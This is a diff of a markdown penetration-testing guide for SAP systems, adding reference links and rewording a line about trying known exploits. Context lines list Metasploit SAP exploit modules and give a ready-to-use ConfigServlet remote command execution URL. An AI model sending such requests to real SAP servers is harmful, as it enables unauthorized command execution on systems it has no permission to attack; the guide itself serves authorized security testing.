@@ -96,7 +96,7 @@ SE84 - Information System for SAP R/3 Authorizations
 - Crawl the URLs (see discovery phase).
 - Fuzz the URLs like in the discovery phase.
 - Look for common web vulnerabilities (Refer to OWASP Top 10) because there are XSS, RCE, XXE, etc. vulnerabilities in some places.
-- Check out Jason Haddix's [The Bug Hunters Methodology](https://github.com/jhaddix/tbhm) for testing web vulnerabilities.
+- Check out Jason Haddix's ["The Bug Hunters Methodology"](https://github.com/jhaddix/tbhm) for testing web vulnerabilities.
 
 ## Attack!
 - Plan the possible exploits / attacks, there are a lot of Metasploit modules for SAP discovery (auxiliary modules) and exploits:
@@ -166,7 +166,7 @@ Matching Modules
    exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
    exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow                   
 ```
-- Try to use some known exploits or attacks like the old but goodie SAP ConfigServlet Remote Code Execution:
+- Try to use some known exploits (check out Exploit-DB) or attacks like the old but goodie "SAP ConfigServlet Remote Code Execution" in the SAP Portal:
 ```
 http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
 ```
@@ -176,3 +176,4 @@ http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sa
 - https://github.com/davehardy20/SAP-Stuff - a script to semi-automate Bizploit
 - [SAP NetWeaver ABAP security configuration part 3: Default passwords for access to the application](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
 - [List of ABAP-transaction codes related to SAP security](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
+- [Breaking SAP Portal](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
